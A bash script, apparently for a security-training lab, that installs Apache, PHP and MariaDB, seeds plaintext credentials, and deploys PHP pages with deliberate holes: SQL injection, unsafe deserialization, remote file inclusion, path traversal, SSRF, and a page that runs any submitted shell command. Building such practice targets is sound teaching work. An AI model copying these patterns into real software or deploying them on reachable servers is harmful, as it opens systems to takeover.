#!/bin/bash

echo "Updating system and installing required packages..."
sudo apt update && sudo apt upgrade -y
sudo apt install -y apache2 php php-mysqli mariadb-server mariadb-client unzip

echo "Starting Apache and MariaDB services..."
sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl start mariadb
sudo systemctl enable mariadb

echo "Setting up MariaDB..."
sudo mysql -e "CREATE DATABASE advanced_vulnerable_app;"
sudo mysql -e "CREATE USER 'vulnerable_user'@'localhost' IDENTIFIED BY 'complexpassword123';"
sudo mysql -e "GRANT ALL PRIVILEGES ON advanced_vulnerable_app.* TO 'vulnerable_user'@'localhost';"
sudo mysql -e "FLUSH PRIVILEGES;"

sudo mysql -e "
USE advanced_vulnerable_app;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user'
);
CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100),
    description TEXT,
    price DECIMAL(10,2)
);
INSERT INTO users (username, password, role) VALUES 
('admin', 'admin123', 'admin'), 
('user', 'user123', 'user');
INSERT INTO products (name, description, price) VALUES 
('Laptop', 'High-end gaming laptop', 1500.00),
('Smartphone', 'Latest model smartphone', 999.99);
"

echo "Creating web application directory..."
sudo mkdir -p /var/www/html/advanced-vulnerable-app
sudo chown -R $USER:$USER /var/www/html/advanced-vulnerable-app

echo "Deploying vulnerable PHP application..."

# Advanced SQL Injection
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/product.php
<?php
$conn = new mysqli("localhost", "vulnerable_user", "complexpassword123", "advanced_vulnerable_app");

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id"; // Vulnerable SQL
$result = $conn->query($query);

if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<h1>" . $row['name'] . "</h1>";
        echo "<p>" . $row['description'] . "</p>";
        echo "<p>Price: $" . $row['price'] . "</p>";
    }
} else {
    echo "Product not found.";
}
?>
EOF

# Insecure Deserialization
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/deserialize.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST['data'];

    // Vulnerable Deserialization
    $object = unserialize($data);
    echo "<pre>";
    print_r($object);
    echo "</pre>";
}
?>
<form method="POST">
    <label>Enter serialized data:</label><br>
    <textarea name="data"></textarea><br>
    <button type="submit">Submit</button>
</form>
EOF

# Remote File Inclusion
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/rfi.php
<?php
$file = $_GET['file']; // Vulnerable RFI
include($file);
?>
<form method="GET">
    <label>Include a file:</label><br>
    <input type="text" name="file"><br>
    <button type="submit">Include</button>
</form>
EOF

# Path Traversal
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/traversal.php
<?php
$file = $_GET['file']; // Vulnerable Path Traversal
echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
?>
<form method="GET">
    <label>Enter file path:</label><br>
    <input type="text" name="file"><br>
    <button type="submit">Read</button>
</form>
EOF

# Server-Side Request Forgery (SSRF)
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/ssrf.php
<?php
$url = $_GET['url']; // Vulnerable SSRF
$response = file_get_contents($url);
echo "<pre>" . htmlspecialchars($response) . "</pre>";
?>
<form method="GET">
    <label>Enter URL:</label><br>
    <input type="text" name="url"><br>
    <button type="submit">Fetch</button>
</form>
EOF

# Command Injection
cat << 'EOF' > /var/www/html/advanced-vulnerable-app/command.php
<?php
$cmd = $_GET['cmd']; // Vulnerable Command Injection
$output = shell_exec($cmd);
echo "<pre>$output</pre>";
?>
<form method="GET">
    <label>Enter command:</label><br>
    <input type="text" name="cmd"><br>
    <button type="submit">Execute</button>
</form>
EOF

sudo systemctl restart apache2

echo "Setup complete. Access your application at http://<your-server-ip>/advanced-vulnerable-app"